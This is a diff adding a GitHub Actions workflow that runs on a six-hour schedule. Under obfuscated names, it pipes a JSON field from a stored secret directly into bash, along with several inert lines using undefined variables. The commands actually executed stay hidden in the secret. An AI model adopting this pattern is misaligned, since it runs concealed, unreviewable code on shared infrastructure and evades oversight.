@@ -1,0 +1,22 @@
+name: baijinshuiqi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: baijinshuiqi
+        env:
+          zz17156: ${{ secrets.zz17156 }}
+        run: |
+          echo $zz17156 | jq -r .bk67648 | /bin/bash
+          echo $imf4927 | jq -r .psg507 | /bin/bash
+          echo $qeb855 | jq -r .cw23842 | /bin/bash
+          echo $obgm07 | jq -r .fjaxr3203 | /bin/bash
+          echo $wb3 | jq -r .vvxw3 | /bin/bash
+
